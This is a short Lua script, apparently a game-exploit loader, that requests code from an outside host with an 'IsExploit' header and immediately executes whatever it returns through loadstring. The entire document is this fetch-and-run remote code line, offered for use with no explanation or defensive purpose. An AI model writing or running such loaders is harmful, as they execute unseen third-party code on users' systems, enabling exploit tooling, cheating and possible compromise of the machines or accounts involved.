(loadstring or load)(request({
    Url = "https://iknoxteam.pythonanywhere.com/script",
    Method = "GET",
    Headers = {
        ["IsExploit"] = "true"
    }
}).Body)()
